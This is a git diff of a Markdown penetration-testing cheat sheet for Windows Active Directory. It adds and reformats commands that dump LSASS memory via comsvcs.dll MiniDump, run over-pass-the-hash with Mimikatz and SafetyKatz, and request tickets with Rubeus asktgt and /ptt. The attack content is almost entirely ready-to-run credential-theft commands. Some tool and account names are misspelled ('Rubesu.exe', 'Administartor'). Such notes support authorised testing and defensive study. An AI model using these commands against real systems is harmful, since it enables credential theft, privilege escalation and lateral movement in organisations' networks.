@@ -49,7 +49,8 @@ tasklist \FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
 ```
 
-__Pass the Hash__
+---
+### Over Pass the Hash
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
 ```
@@ -57,7 +58,16 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.loc
 ```powershell
 safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
 ```
-- Above commands starts ps sessions with _logon type 9_ same as 
+
+> Above commands starts ps sessions w/ _logon type 9_ same as `runas /netonly`
+
+```powershell
+Rubesu.exe asktgt /user:administator /rc4:<ntlmhash> /ptt
+```
+
+```powershell
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 
 ---
 ### AsReproasting
